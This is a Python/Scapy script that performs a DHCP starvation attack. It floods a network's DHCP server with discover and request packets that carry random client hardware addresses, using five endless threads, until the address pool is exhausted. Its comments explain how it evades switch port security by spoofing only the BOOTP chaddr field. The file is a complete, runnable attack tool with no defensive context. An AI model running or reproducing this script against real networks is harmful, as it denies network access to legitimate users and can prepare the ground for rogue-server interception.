#!/usr/bin/python

# Developed on:
# Kali Linux
# Python v2.7
# Scapy v2.3.1

# Client first sends DHCPDISCOVER packet broadcasted
# DHCP Server will then reply with a DHCPOFFER with a IP Address
# If multiple offers received, the client will reply to one with a DHCPREQUEST with the offered IP Address
# Once the DHCP Server receives the request packet, it will reply with a DHCPACK to acknowledge the request

# Since switches with PortSecurity enabled only checks Layer 2 MAC addresses, we can evade PortSecurity by modifying the "chaddr" in the Layer 5 packet

# Ensure that you are only connected to one interface

import sys
import random
import logging
from threading import Thread
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# Fuction used to generated MAC addresses to be sent to the Switch
def randomiseMAC():
	generation = [random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
	sanitiseGeneratedMAC = ':'.join(map(lambda x: "%02x" % x, generation))
	return sanitiseGeneratedMAC

# To generate Transaction IDs for DHCP transaction
def randomiseTransactionID():
	return random.randint(0x00000000, 0xFFFFFFFF)

# Function to build the initial DHCPDISCOVER packet
def buildDiscoverPacket(mac2send, xid2send, ownMACdiscover):
	discoverEthernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=ownMACdiscover, type=0x800) # If src is set to randomised MAC address, it will trigger port security
	discoverIP = IP(src='0.0.0.0', dst='255.255.255.255')
	discoverUDP = UDP(sport=68, dport=67)
	discoverBOOTP = BOOTP(chaddr=mac2send, ciaddr='0.0.0.0', xid=xid2send, flags=1)
	discoverDHCP = DHCP(options=[("message-type","discover"),"end"])
	discoverPacket = discoverEthernet / discoverIP / discoverUDP / discoverBOOTP / discoverDHCP
	return discoverPacket

# Function used to extract the offered IP by the server. Can be used in both DHCPOFFER and DHCPACK packets
def extractOfferedIP(answerPacket):
	for pair in answerPacket:
		p=pair[1]
		d=p[DHCP]
		
		offeredIP = p[BOOTP].yiaddr
	return offeredIP

#Function to build DHCPREQUEST packet based on offered IP in DHCPOFFER packet
def buildRequestPacket(serverOfferedIP, mac2send, xid2send, ownMACrequest):
	requestEthernet = Ether(dst="ff:ff:ff:ff:ff:ff", src=ownMACrequest, type=0x800) # If src is set to randomised MAC address, it will trigger port security
	requestIP = IP(src='0.0.0.0', dst='255.255.255.255')
	requestUDP = UDP(sport=68, dport=67)
	requestBOOTP = BOOTP(chaddr=mac2send, xid=xid2send)
	requestDHCP = DHCP(options=[("message-type","request"),("requested_addr",serverOfferedIP),"end"])
	requestPacket = requestEthernet / requestIP / requestUDP / requestBOOTP / requestDHCP
	return requestPacket

# Each thread will be running this mainProgram() function
def mainProgram():
	conf.checkIPaddr = False # Important to have

	ownPhysicalAddress = get_if_hwaddr(sys.argv[1]) 
	while 1:
		currentInstanceMAC = randomiseMAC()
		currentInstanceTransactionID = randomiseTransactionID()
		discoveredAnswer, undiscoveredAnswer = srp(buildDiscoverPacket(currentInstanceMAC, currentInstanceTransactionID, ownPhysicalAddress), verbose=0)
		serverOfferIP = extractOfferedIP(discoveredAnswer)
		requestAnswer, unrequestedAnswer = srp(buildRequestPacket(serverOfferIP, currentInstanceMAC, currentInstanceTransactionID, ownPhysicalAddress), verbose=0)
		
		print "Accquired IP: " + extractOfferedIP(requestAnswer)
		
# Threads are used to conduct the DHCP Starvation attack to accquire multiple IP addresses concurrently
if len(sys.argv) == 2:
	print "Performing DHCP Starvation attack!"
	t1 = Thread(target= mainProgram)
	t2 = Thread(target= mainProgram)
	t3 = Thread(target= mainProgram)
	t4 = Thread(target= mainProgram)
	t5 = Thread(target= mainProgram)
	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
else:
	print "Usage: ./DHCP-Starvation <interface which MAC address is to be used>"
	print "e.g ./DHCP-Starvation eth0"
	sys.exit(2)	